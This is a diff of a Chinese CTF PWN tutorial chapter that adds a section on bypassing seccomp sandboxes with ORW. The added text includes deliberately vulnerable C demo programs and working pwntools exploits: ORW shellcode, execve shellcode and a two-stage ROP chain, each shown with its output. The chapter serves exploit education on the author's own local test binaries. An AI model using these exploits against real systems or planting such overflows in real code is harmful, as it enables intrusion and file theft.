@@ -14,7 +14,7 @@ publish: true
 
 > [!info]- 章节信息
 > **所属方向**：PWN ｜ **难度阶段**：L2 栈上利用期 ｜ **前置要求**：[[P06-栈溢出原理与ret2win|P6]] · [[P03-ELF链接与延迟绑定|P3]] · [[P05-pwntools与GDB插件工具链|P5]]
-> **本章目标**：回答 [[P06-栈溢出原理与ret2win|P6]] 留下的那个问题——程序里没有 `win` 函数时，控制了返回地址之后跳去哪；把三条经典路线 ret2syscall、ret2libc、ret2shellcode 各配一个从编译到 getshell 的完整 exploit，外加 one_gadget 这条捷径和三链的选型方法。
+> **本章目标**：回答 [[P06-栈溢出原理与ret2win|P6]] 留下的那个问题——程序里没有 `win` 函数时，控制了返回地址之后跳去哪；把三条经典路线 ret2syscall、ret2libc、ret2shellcode 各配一个从编译到 getshell 的完整 exploit，外加 one_gadget 这条捷径、三链的选型方法，以及 seccomp 沙箱禁掉 `execve` 时的 ORW 出口。
 
 [[P06-栈溢出原理与ret2win|P6]]的 ret2win 有个前提：程序里恰好躺着一个"永远不该被调用"的 `win`。真实赛题的程序多半没有这种善意——返回地址已经能填成任意值，==接下来执行什么，得自己安排==。本章给出三个安排法：
 
@@ -32,6 +32,7 @@ publish: true
 | ret2libc | 动态链接 + 程序里能借到输出函数（`puts`/`printf`）+ libc 版本可确定（附件或指纹检索） | 栈可执行 | 2 |
 | one_gadget（ret2libc 的捷径） | 同 ret2libc 的泄露条件，且跳入时刻能满足它的约束 | 同上 | 2（第二轮只要一个地址） |
 | ret2shellcode | NX 关闭（栈或某块内存可执行）+ 那块内存的地址可知（泄露、固定常量或关闭 ASLR） | 输出通道 | 1 |
+| ORW（第 6 节） | seccomp 白名单里留着 `open`/`openat` 与 `read`/`write`——`seccomp-tools dump` 一看便知 | `execve` 可用 | 1–2 |
 
 拿到一道题，按固定顺序问四个问题，答案直接指向路线：
 
@@ -40,10 +41,12 @@ publish: true
 3. **看输出通道**：程序里有没有能借来打印数据的 `puts@plt`/`printf@plt`——有，ret2libc 的泄露才成立；
 4. **看附件**：题目附带 libc 文件吗——附带就走 [[P03-ELF链接与延迟绑定#6.6 题目自带 libc 时|P3 6.6]] 的流程，没附带练指纹检索。
 
+第五种局面藏在运行期：程序里有 `prctl` 和一长段装过滤器的 BPF 代码——seccomp 沙箱，getshell 的三条路线全部作废，出口换成第 6 节的 ORW。
+
 > [!info]- 为什么 NX 开着，前两条路线照样能用
 > NX 挡的是"执行数据页上的字节"（机制 [[P04-Linux安全缓解机制|P4]]）。ret2syscall 和 ret2libc 的链上每一格都是==已有代码的地址==：gadget 在程序或 libc 的代码段里，`system` 在 libc 的代码段里，`syscall` 指令也在——没有任何一个字节需要在数据页上执行。这个思路就是 ROP（Return-Oriented Programming）名字的含义：把现成代码按"ret 串起来的片段"重新组织，[[P06-栈溢出原理与ret2win#4. 带参数的 win：第一个 gadget|P6 第 4 节]]的第一条 gadget 链已经演示过这个组织方式。
 
-三条路线的实现都是同一副骨架：==P6 量出的偏移 + "跳去哪"的具体答案==。本章三个演示程序全部沿用 P6 的布局（`buf[32]`、`gets`、无 Canary、无 PIE），偏移都是 40，量法不再重复。
+三条路线的实现都是同一副骨架：==P6 量出的偏移 + "跳去哪"的具体答案==。本章的演示程序全部沿用 P6 的布局与判读（无 Canary、无 PIE），偏移各处标明、量法不再重复；第 6 节起输入函数换用 `read`——它按字节数读取、没有 gets 的换行刹车（[[P06-栈溢出原理与ret2win#7. 输入函数与 payload：gets 与 read 的差别|P6 第 7 节]]），payload 里出现 `\x00`、`\x0a` 都不再受限。
 
 ## 2. ret2syscall：不依赖任何泄露
 
@@ -1076,20 +1079,618 @@ mprotect 是改页权限的系统调用，[[04-汇编语言精要#10. 系统调�
 
 链序：`read(0, bss, n)` 写入 → `mprotect(bss 起始页, 长度, 7)` → 返回地址落到 bss。三段各是一组"pop 装参 + 函数地址"，链会很长，但每一格的拼法都是本章与 P6 已练的动作组合。把这条链完整拼出来，放到 [[P08-ROP进阶与SROP|P8]]学过栈迁移之后再做正合适——那时还能学到让长链变短的办法。
 
-## 6. 三链对比
+## 6. seccomp 沙箱与 ORW：execve 被禁之后
 
-| | ret2syscall | ret2libc | one_gadget | ret2shellcode |
-| ---- | ---- | ---- | ---- | ---- |
-| 交互轮数 | 1 | 2 | 2（第二步一个地址） | 1 |
-| NX | 开着照用 | 开着照用 | 开着照用 | ==必须关== |
-| 静态/动态 | 静态最有利（gadget 齐全） | 动态专属 | 动态专属 | 皆可 |
-| libc 信息 | 不需要 | ==必须确定版本== | 同左 | 不需要 |
-| 输出通道 | 不需要 | 必须能借到 | 同左 | 不需要 |
-| 常见失败原因 | 变体 gadget 的副作用没排序（如清 rax 的排在装号之后）；找不到 "/bin/sh" | 对齐没垫；版本不匹配（[[P03-ELF链接与延迟绑定\|P3]]）；泄露解析错位 | 约束不满足 | 坏字符；模板 push 蹭尾；页权限不对（bss） |
+前五节的终点都是 shell。有一类题把这条路从根上堵死：程序启动时用 **seccomp** 给自己装了一个系统调用过滤器，`execve` 一触发进程当场被内核杀掉——控制流哪怕完全打穿，shell 也开不起来。思路要调整：==拿 shell 只是手段，读 flag 才是目的==。`open`、`read`、`write` 三个系统调用就能完成读文件的全流程，绝大多数沙箱不禁它们——这条出口按三个调用的首字母叫 **ORW**。本节造两个演示程序把整条链走通：一个用 shellcode，一个用 ROP；过滤器怎么读、文件描述符怎么分配、短读怎么处理，都在这两题里展开。
 
-骨架是同一副：==偏移（P6）+ 填充 + 地址串==。选择时把第 1 节的四个问题过一遍，路线就能定下来；做不出来时，失败原因那一列就是排错起点。
+### 6.1 seccomp：给进程装一个系统调用过滤器
 
-## 7. 常见问题
+seccomp（secure computing mode）是内核提供的系统调用过滤机制。进程用 `prctl` 往内核装一段 BPF 程序，此后每一次系统调用都先过这段程序，按它的裁决放行、报错或杀掉进程。装过滤器固定两步：
+
+```c
+prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);             /* 前置：声明本进程不再提权 */
+prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);  /* 装入过滤器 */
+```
+
+非特权进程必须先设 `PR_SET_NO_NEW_PRIVS` 才装得上过滤器。`prog` 是一组 BPF 指令，判读对象是一个固定的 `seccomp_data` 结构：
+
+| 偏移 | 字段 | 内容 |
+| ---- | ---- | ---- |
+| 0 | nr | 系统调用号 |
+| 4 | arch | 架构标识，x86-64 是 `AUDIT_ARCH_X86_64` |
+| 8 | instruction_pointer | 发起调用的指令地址 |
+| 16 | args[6] | 六个参数的原始值 |
+
+BPF 指令只有三个动作：`LD` 把某个字段装进累加器 A；`JEQ` 比较 A 与常数、按结果跳转；`RET` 给出裁决——`SECCOMP_RET_ALLOW` 放行，`SECCOMP_RET_KILL` 杀进程，`SECCOMP_RET_ERRNO` 把这次调用变成一个错误码返回。演示程序一（6.2 用 shellcode 打它）：
+
+```c
+/* orw_sc.c —— ORW 演示程序一：seccomp 白名单 + 栈页可执行（x86-64 Linux） */
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/prctl.h>
+#include <linux/filter.h>
+#include <linux/seccomp.h>
+#include <linux/audit.h>
+#include <sys/syscall.h>
+
+/* 白名单过滤器：只放行 read/write/open/openat/close/exit/exit_group，其余杀掉进程 */
+static void install_seccomp(void) {
+    struct sock_filter filter[] = {
+        /* 第 0 关：校验架构（seccomp_data 偏移 4 是 arch 字段），不是 x86-64 直接杀 */
+        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, 4),
+        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_IMM, AUDIT_ARCH_X86_64, 1, 0),
+        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
+        /* 第 1 关：加载系统调用号（偏移 0） */
+        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, 0),
+        /* 第 2 关：白名单逐个比对，命中即放行 */
+        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_IMM, __NR_read, 0, 1),
+        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
+        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_IMM, __NR_write, 0, 1),
+        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
+        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_IMM, __NR_open, 0, 1),
+        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
+        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_IMM, __NR_openat, 0, 1),
+        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
+        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_IMM, __NR_close, 0, 1),
+        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
+        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_IMM, __NR_exit, 0, 1),
+        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
+        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_IMM, __NR_exit_group, 0, 1),
+        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
+        /* 落到这里：不在白名单，杀 */
+        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
+    };
+    struct sock_fprog prog = {
+        .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),
+        .filter = filter,
+    };
+    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);   /* 装过滤器的非特权前置条件 */
+    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);
+}
+
+void vuln(void) {
+    char buf[64];
+    printf("buf=%p\ninput> ", buf);
+    read(0, buf, 0x200);          /* 漏洞点：0x200 进 64 字节 buf */
+}
+
+int main(void) {
+    setbuf(stdout, NULL);
+    install_seccomp();
+    vuln();
+    puts("bye");
+    return 0;
+}
+```
+
+```bash
+gcc -O0 -fno-pie -no-pie -fno-stack-protector -z execstack orw_sc.c -o orw_sc
+```
+
+输出：
+
+```
+orw_sc.c: In function 'vuln':
+orw_sc.c:48:5: warning: 'read' writing 512 bytes into a region of size 64 overflows the destination [-Wstringop-overflow=]
+   48 |     read(0, buf, 0x200);          /* 漏洞点：0x200 进 64 字节 buf */
+      |     ^~~~~~~~~~~~~~~~~~~
+……（note 行省略）
+```
+
+溢出警告指着的正是漏洞点（[[P06-栈溢出原理与ret2win#1.1 示例程序与编译|P6 1.1]] 的 gets 同款），编译照常通过。`-z execstack` 是 6.2 的 shellcode 要用的，与 seccomp 互不干扰。
+
+过滤器装好之后长什么样，不用读源码——**seccomp-tools** 把运行中的进程实际装上的过滤器 dump 成可读格式（Ruby 工具，`gem install seccomp-tools` 安装，与第 4 节的 one_gadget 同源）：
+
+```bash
+echo | seccomp-tools dump ./orw_sc
+```
+
+输出：
+
+```
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
+ 0002: 0x06 0x00 0x00 0x00000000  return KILL
+ 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0004: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0006
+ 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0006: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0008
+ 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0008: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0010
+ 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0010: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0012
+ 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0012: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0014
+ 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0014: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0016
+ 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0016: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0018
+ 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0018: 0x06 0x00 0x00 0x00000000  return KILL
+```
+
+三段与源码一一对应：0000–0002 校验架构，0003 加载调用号，0004–0017 白名单逐个放行（read、write、open、openat、close、exit、exit_group），0018 兜底杀掉。==做题先跑 seccomp-tools dump——白名单就是出口的形状==：`execve` 不在、ORW 三样在，路线当场定下。
+
+> [!info]- 开头为什么先校验架构
+> 调用号表是按架构分的：x86-64 的 59 号是 execve，32 位调用路径（`int 0x80`）的 59 号却是另一个调用。x86-64 进程完全可以用 32 位指令发起系统调用，绕开 x86-64 的调用号白名单。所以正规的过滤器先比对 `arch` 字段，不是 x86-64 的调用直接杀——0001 行的 `0xc000003e` 就是 `AUDIT_ARCH_X86_64` 的值。自己写过滤器时，这一段不要省。
+
+ORW 用到的调用号与参数（x86-64 Linux / System V AMD64 ABI，完整约定 [[04-汇编语言精要#10. 系统调用：程序开口找内核办事|通用基础 04 章第 10 节]]整理过）：
+
+| 调用 | 号 | 参数 |
+| ---- | ---- | ---- |
+| read | 0 | rdi = fd，rsi = 缓冲，rdx = 请求字节数 |
+| write | 1 | rdi = fd，rsi = 缓冲，rdx = 字节数 |
+| open | 2 | rdi = 路径，rsi = flags（O_RDONLY = 0），rdx = mode |
+| close | 3 | rdi = fd |
+| openat | 257 | rdi = dirfd，rsi = 路径，rdx = flags，r10 = mode |
+
+rax 放调用号——与 2.1 的 execve 完全同一副约定，==ORW 链没有新知识，只有新的调用号==。
+
+沙箱真的会拦。对照实验：把 5.2 的 execve shellcode 原样送进演示程序一：
+
+```python
+#!/usr/bin/env python3
+# exp_sigsys.py —— 对照实验：换成 execve 的 shellcode，沙箱当场杀进程
+from pwn import *
+
+context.arch = 'amd64'
+context.log_level = 'error'
+
+sc = asm(shellcraft.amd64.linux.execve('/bin/sh', 0, 0))
+
+io = process('./orw_sc')
+io.recvuntil(b'buf=')
+buf = int(io.recvline().strip(), 16)
+io.send(sc.ljust(72, b'B') + p64(buf))
+io.recvall(timeout=3)
+print('进程退出状态 =', io.poll(True))
+io.close()
+```
+
+```bash
+python3 exp_sigsys.py
+```
+
+输出：
+
+```
+进程退出状态 = -31
+```
+
+-31 是 SIGSYS 的信号编号：==内核在系统调用入口直接发出的信号==，不经过程序自己的任何代码。做沙箱题看到退出状态 -31，第一反应就是"这次调了白名单外的调用"。
+
+### 6.2 ORW shellcode：手写三条 syscall
+
+5.2 的模板清单里那款 `cat('/flag')`，内部就是本章这套流程。拆开手写一遍，全程四步——拼路径、open、read 循环、写出：
+
+```asm
+; orw_flag.s —— 读当前目录 flag.txt 打到 stdout（x86-64 Linux，System V AMD64 ABI）
+global _start
+
+section .text
+_start:
+    xor  esi, esi                 ; O_RDONLY = 0
+    push rsi                      ; 8 字节 0 压栈，充当串尾的 '\0'
+    mov  rax, 0x7478742e67616c66  ; "flag.txt" 八个字节按小端排成的整数
+    push rax                      ; 压栈后 rsp 处正好是 "flag.txt\0"
+    mov  rdi, rsp                 ; 第 1 步：rdi = 路径
+    xor  edx, edx                 ; mode 置 0（只读打开用不到）
+    mov  eax, 2                   ; __NR_open = 2
+    syscall                       ; 第 2 步：open，成功时 rax = 分到的 fd
+    mov  r12d, eax                ; fd 转存进 r12d：后面的 syscall 会覆盖 rax
+    sub  rsp, 0x100               ; 栈上留 0x100 当读入缓冲
+.read:
+    mov  edi, r12d                ; 第 3 步：read(fd, rsp, 0x100)
+    mov  rsi, rsp
+    mov  edx, 0x100
+    xor  eax, eax                 ; __NR_read = 0
+    syscall
+    test rax, rax
+    jle  .done                    ; ≤ 0：读完（0）或出错（负数）
+    mov  edx, eax                 ; 第 4 步：写出长度用 read 的返回值，不用请求值
+    mov  edi, 1                   ; stdout
+    mov  rsi, rsp
+    mov  eax, 1                   ; __NR_write = 1
+    syscall
+    jmp  .read
+.done:
+    mov  eax, 60                  ; __NR_exit = 60
+    xor  edi, edi
+    syscall
+```
+
+文件名的安放全靠 push：先压一个全零的 rsi 当 `'\0'`，再压 `0x7478742e67616c66`——它是 `"flag.txt"` 八个字节按小端排成的整数，压栈后 rsp 处正好是 `"flag.txt\0"` 九个字节。==不依赖任何数据段==，shellcode 挪到哪都能用（5.4 的 jmp rsp 独立性是同一原则）。fd 转存进 r12d 也值得注意：read、write 每次都会改写 rax，==fd 要放在不会被系统调用碰的寄存器里==。
+
+独立验证：
+
+```bash
+nasm -f elf64 orw_flag.s -o orw_flag.o && ld orw_flag.o -o orw_flag
+./orw_flag
+```
+
+输出：
+
+```
+flag{p7_orw_via_syscall}
+```
+
+注入演示程序一（栈可执行、地址靠程序打印，5.2 的前提）。这里撞上 5.2 折叠框预告过的坑：这份手写 shellcode 有 80 余字节，超过 72 字节的窗口，按 at_buf 摆法会把返回地址槽自己盖掉。用同款解法 ==after_ret==：shellcode 挪到返回地址槽之后，返回地址指 `buf+80`——ret 弹出后 rsp 恰好指着 shellcode 第一个字节，它的 push 全部落在下方：
+
+```python
+#!/usr/bin/env python3
+# exp_orw_sc.py —— 演示程序一：seccomp 禁了 execve，shellcode 改走 ORW
+from pwn import *
+
+context.arch = 'amd64'
+context.log_level = 'info'
+
+OFFSET = 72                       # buf 在 rbp-0x40：64 字节 buf + 8 字节 saved rbp
+
+sc = asm('''
+    xor  esi, esi
+    push rsi
+    mov  rax, 0x7478742e67616c66
+    push rax
+    mov  rdi, rsp
+    xor  edx, edx
+    mov  eax, 2
+    syscall
+    mov  r12d, eax
+    sub  rsp, 0x100
+read_loop:
+    mov  edi, r12d
+    mov  rsi, rsp
+    mov  edx, 0x100
+    xor  eax, eax
+    syscall
+    test rax, rax
+    jle  read_done
+    mov  edx, eax
+    mov  edi, 1
+    mov  rsi, rsp
+    mov  eax, 1
+    syscall
+    jmp  read_loop
+read_done:
+    mov  eax, 60
+    xor  edi, edi
+    syscall
+''')
+
+io = process('./orw_sc')
+io.recvuntil(b'buf=')
+buf = int(io.recvline().strip(), 16)
+success('buf @ ' + hex(buf))
+# shellcode 挪到返回地址槽之后：ret 弹出 buf+80 后，rsp 恰指 shellcode 第一个字节
+io.send(b'B' * OFFSET + p64(buf + OFFSET + 8) + sc)
+print(io.recvall(timeout=3).decode(errors='replace').rstrip('\x00'))
+io.close()
+```
+
+```bash
+python3 exp_orw_sc.py
+```
+
+输出：
+
+```
+[x] Starting local process './orw_sc'
+[+] Starting local process './orw_sc': pid 632
+[+] buf @ 0x7ffebc6dc930
+[x] Receiving all data
+[x] Receiving all data: 7B
+[*] Process './orw_sc' stopped with exit code 0 (pid 632)
+[+] Receiving all data: Done (32B)
+input> flag{p7_orw_via_syscall}
+```
+
+flag 直接打在 stdout 上：==没有 shell，flag 照拿==。
+
+### 6.3 文件描述符与短读：两个最容易出错的细节
+
+**fd 从几号开始。**进程一启动，0、1、2 已经被 stdin、stdout、stderr 占用，内核分配 fd 的规则是==取最低的空闲号==，所以演示里的 open 返回 3。但 3 不是定律：open 之前程序若还开过别的文件（配置、日志、Socket），号会顺延；一些题故意先 `close(1)` 再让 flag 被打开，flag 文件顶到 1 号，此后 `write(1, ...)` 打的就是 flag。==把 fd 写死在链里是 ORW 的经典事故==，正确姿势是把 open 的返回值一路带进 read——6.2 的 shellcode 用 r12d 转存就是这个目的。
+
+**read 给多少不一定。**请求 0x100，返回可能正好 0x100，也可能更少——管道、Socket 这类通道上，==read 的返回值才是实际读到的字节数==。普通文件一次 read 常能读全；远程题里 flag 内容经过管道或 Socket 中转，短读随时发生。所以 6.2 的 shellcode 把写出长度取自 `mov edx, eax`（read 的返回值）而不是写死 0x100，外面再套一层循环，直到返回 0。
+
+造一个必然出短读的现场：FIFO（命名管道）上一次写入 525 字节，循环版与无循环版分别去读。无循环版 `orw_flag_noloop.s` 与 6.2 的代码只差两处：read 之后没有 `test/jle/jmp` 的循环，写出长度固定 `mov edx, 0x100`：
+
+```bash
+rm -f flag.txt && mkfifo flag.txt
+( printf 'flag{p7_short_read_loop}'; printf 'X%.0s' $(seq 500); printf '\n' ) > flag.txt &
+sleep 0.3
+./orw_flag > loop_out.txt              # 循环版
+wait
+rm -f flag.txt && mkfifo flag.txt
+( printf 'flag{p7_short_read_loop}'; printf 'X%.0s' $(seq 500); printf '\n' ) > flag.txt &
+sleep 0.3
+./orw_flag_noloop > noloop_out.txt     # 无循环版
+wait
+wc -c loop_out.txt noloop_out.txt
+```
+
+输出：
+
+```
+ 525 loop_out.txt
+ 256 noloop_out.txt
+ 781 total
+```
+
+循环版 525 字节一字不少；无循环版只有 0x100 字节，而且结尾不是数据：
+
+```bash
+tail -c 16 noloop_out.txt | xxd
+```
+
+输出：
+
+```
+00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+```
+
+末尾 16 个字节是 `\0`——旧栈上的内容。这正是短读的直接证据：那一次 read 实际返回的字节不足 0x100，write 却按请求值把整个缓冲写出，==缓冲里 read 没碰过的部分原样跟着出了门==。两句话收拢：==请求值决定"最多读多少"，返回值才是"实际读了多少"==，写出永远跟着返回值走。
+
+> [!info]- fd 的更多玩法
+> `dup2(oldfd, newfd)` 把一个 fd 复制到指定号上。除了 `close(1)` 让 flag 顶替 stdout，还有反向用法：`dup2(4, 1)` 把连着远程的 Socket（比如 4 号）顶替成 stdout，此后 ORW 的 write 直接打进连接。socat 托管的远程题里，0/1/2 之外常多出一个连着远端的 fd，动手前先弄清自己手里有哪几个号。
+
+### 6.4 ORW 的 ROP 版：静态程序与两段链
+
+演示程序二换回真实赛题最常见的配置：NX 开（栈上放不了 shellcode）、静态链接（gadget 海量，2.3 的检索流程直接复用）。seccomp 过滤器与演示程序一相同：
+
+```c
+/* orw_rop.c —— ORW 演示程序二：seccomp 白名单 + 静态链接（x86-64 Linux） */
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/prctl.h>
+#include <linux/filter.h>
+#include <linux/seccomp.h>
+#include <linux/audit.h>
+#include <sys/syscall.h>
+
+/* install_seccomp() 与演示程序一完全相同：
+   白名单 read/write/open/openat/close/exit/exit_group，源码见 6.1 */
+
+char staging[0x200];   /* bss 里的固定落点：第一段链把文件名写在这里，第二段链从这里读 */
+
+void vuln(void) {
+    char buf[32];
+    printf("input> ");
+    read(0, buf, 0x300);          /* 漏洞点：0x300 进 32 字节 buf */
+}
+
+int main(void) {
+    setbuf(stdout, NULL);
+    install_seccomp();
+    vuln();
+    puts("bye");
+    return 0;
+}
+```
+
+```bash
+gcc -O0 -fno-pie -no-pie -fno-stack-protector -static orw_rop.c -o orw_rop
+```
+
+输出：
+
+```
+orw_rop.c: In function 'vuln':
+orw_rop.c:46:5: warning: 'read' writing 768 bytes into a region of size 32 overflows the destination [-Wstringop-overflow=]
+   46 |     read(0, buf, 0x300);          /* 漏洞点：0x300 进 32 字节 buf */
+      |     ^~~~~~~~~~~~~~~~~~~
+……（note 行省略）
+```
+
+```bash
+pwn checksec ./orw_rop
+objdump -d -M intel orw_rop | sed -n '/<vuln>:/,/^$/p'
+```
+
+输出：
+
+```
+[*] '/home/hua/p7/orw_rop'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+0000000000401b45 <vuln>:
+  401b45:	f3 0f 1e fa          	endbr64
+  401b49:	55                   	push   rbp
+  401b4a:	48 89 e5             	mov    rbp,rsp
+  401b4d:	48 83 ec 20          	sub    rsp,0x20
+  401b51:	bf 10 70 48 00       	mov    edi,0x487010
+  401b56:	b8 00 00 00 00       	mov    eax,0x0
+  401b5b:	e8 e0 37 00 00       	call   405340 <_IO_printf>
+  401b60:	48 8d 45 e0          	lea    rax,[rbp-0x20]
+  401b64:	ba 00 03 00 00       	mov    edx,0x300
+  401b69:	48 89 c6             	mov    rsi,rax
+  401b6c:	bf 00 00 00 00       	mov    edi,0x0
+  401b71:	e8 1a 00 02 00       	call   421b90 <__libc_read>
+  401b76:	90                   	nop
+  401b77:	c9                   	leave
+  401b78:	c3                   	ret
+```
+
+"Canary found" 是静态程序的符号误报（2.2 的 warning），反汇编里没有 `%fs:0x28`。`buf` 在 `rbp-0x20`，偏移 40；`read` 来自静态链入的 `__libc_read`——静态程序没有 PLT，调用直接落进文件内部（2.2 见过同款形态）。
+
+新问题只有一个：==文件名字符串放哪==。程序里没有现成的路径串（2.3 折叠框讲过静态链接按需链入的缘故），栈地址又未知。2.3 折叠框预告过的==两段链==在这里兑现：
+
+- **第一段**：借溢出拼一条 `read(0, staging, 0x10)`，把下一拍输入（文件名）写进 bss 里地址固定的落点，然后返回地址指回 `vuln`，再溢一次；
+- **第二段**：`open(staging, 0, 0)` → `read(3, staging, 0x100)` → `write(1, staging, 0x100)` 三条 syscall 顺序拼装。
+
+落点用源码里自备的全局数组（`const char sh[]` 的同款做法，2.3 折叠框），非 PIE 下地址是常量：
+
+```bash
+nm orw_rop | grep -w 'B staging'
+```
+
+输出：
+
+```
+00000000004b2aa0 B staging
+```
+
+gadget 检索（全量落盘后 grep，流程 2.3）：
+
+```bash
+ROPgadget --binary orw_rop > gadgets_rop.txt 2>/dev/null
+grep -E ": pop (rax|rdi|rsi|rdx) ; ret$" gadgets_rop.txt
+grep -E ": pop (rdi|rsi|rdx) ; (pop [a-z0-9]+|xor [a-z]+, [a-z]+)( ; pop [a-z0-9]+)* ; ret$" gadgets_rop.txt
+```
+
+输出：
+
+```
+0x000000000042ae03 : pop rax ; ret
+
+0x000000000040250b : pop rdi ; pop rbp ; ret
+0x00000000004748ca : pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
+0x0000000000402509 : pop rsi ; pop r15 ; pop rbp ; ret
+0x00000000004028b3 : pop rsi ; pop rbp ; ret
+0x0000000000443c89 : pop rsi ; xor rax, rdx ; pop r15 ; pop rbp ; ret
+```
+
+与 2.3 同一批型号：朴素版只有 rax；rdi、rsi 用带搭头的变体，多弹的寄存器垫废值；rdx 沿用 2.4 的排序纪律——它顺带 `xor eax, eax`，==必须排在装调用号之前==。
+
+```python
+#!/usr/bin/env python3
+# exp_orw_rop.py —— 演示程序二：两段 ROP 链完成 ORW（静态链接，NX 开）
+from pwn import *
+import time
+
+context.arch = 'amd64'
+context.log_level = 'info'
+
+OFFSET      = 40          # buf 在 rbp-0x20：32 字节 buf + 8 字节 saved rbp
+POP_RDX     = 0x4748ca    # pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
+POP_RSI     = 0x4028b3    # pop rsi ; pop rbp ; ret
+POP_RDI     = 0x40250b    # pop rdi ; pop rbp ; ret
+POP_RAX     = 0x42ae03    # pop rax ; ret
+SYSCALL     = 0x421c09    # 字节检索 0f 05 c3 命中的 syscall ; ret（链要续，syscall 必须带返回路径）
+STAGING     = 0x4b2aa0    # nm orw_rop | grep staging：bss 里的固定落点
+
+e  = ELF('./orw_rop', checksec=False)
+io = process('./orw_rop')
+
+# ---- 第一段：read(0, staging, 0x10) 把文件名送进 bss，再回到 vuln 等第二轮 ----
+chain1 = flat(
+    b'A' * OFFSET,
+    POP_RDI, 0, 0,                 # rdi = 0（stdin）；废值弹进 rbp
+    POP_RSI, STAGING, 0,           # rsi = staging；废值弹进 rbp
+    POP_RDX, 0x10, 0, 0, 0, 0,     # rdx = 0x10；rax 被这条顺带清零；4 个废值弹进 rbx/r12/r13/rbp
+    POP_RAX, 0,                    # rax = 0（read 的调用号）
+    SYSCALL,
+    e.symbols['vuln'],             # 回到 vuln，再溢一次
+)
+io.sendafter(b'input> ', chain1)
+time.sleep(0.5)    # 等链上的 read(0, staging, 0x10) 真正停在内核里等输入；贴太紧会被 vuln 的 read 一口吞掉
+io.send(b'flag.txt\x00'.ljust(0x10, b'\x00'))    # 第一段 read 读走的数据：文件名进 bss
+
+# ---- 第二段：open → read → write 三条 syscall ----
+chain2 = flat(
+    b'A' * OFFSET,
+    # open(staging, 0, 0)：返回 fd = 3（0/1/2 已被占用）
+    POP_RDI, STAGING, 0,
+    POP_RSI, 0, 0,
+    POP_RDX, 0, 0, 0, 0, 0,
+    POP_RAX, 2,                    # __NR_open = 2
+    SYSCALL,
+    # read(3, staging, 0x100)：flag 内容读进同一个 bss 缓冲
+    POP_RDI, 3, 0,
+    POP_RSI, STAGING, 0,
+    POP_RDX, 0x100, 0, 0, 0, 0,
+    POP_RAX, 0,                    # __NR_read = 0
+    SYSCALL,
+    # write(1, staging, 0x100)：写到 stdout
+    POP_RDI, 1, 0,
+    POP_RSI, STAGING, 0,
+    POP_RDX, 0x100, 0, 0, 0, 0,
+    POP_RAX, 1,                    # __NR_write = 1
+    SYSCALL,
+    POP_RAX, 60,                   # __NR_exit = 60；退出码在 rdi，残留着 write 的 1，无妨
+    SYSCALL,
+    0,
+)
+io.sendafter(b'input> ', chain2)
+print(io.recvall(timeout=3).rstrip(b'\x00').decode(errors='replace'))
+io.close()
+```
+
+```bash
+python3 exp_orw_rop.py
+```
+
+输出：
+
+```
+[x] Starting local process './orw_rop'
+[+] Starting local process './orw_rop': pid 636
+[x] Receiving all data
+[x] Receiving all data: 0B
+[*] Process './orw_rop' stopped with exit code 1 (pid 636)
+[x] Receiving all data: 256B
+[+] Receiving all data: Done (256B)
+flag{p7_orw_via_syscall}
+```
+
+256 字节里，flag 在最前面，后面的 `\x00` 是 `rstrip` 收走的尾部（staging 先装文件名、再被 flag 内容覆盖，位置没用满的部分一直是 0）。退出码 1 也对得上账：`exit` 的退出码在 rdi，链上没有装它，残留的是 write 用的 1——==无伤大雅，flag 已经出门==。
+
+> [!warning] 第一段链上的 read 没有提示符，两拍要隔开
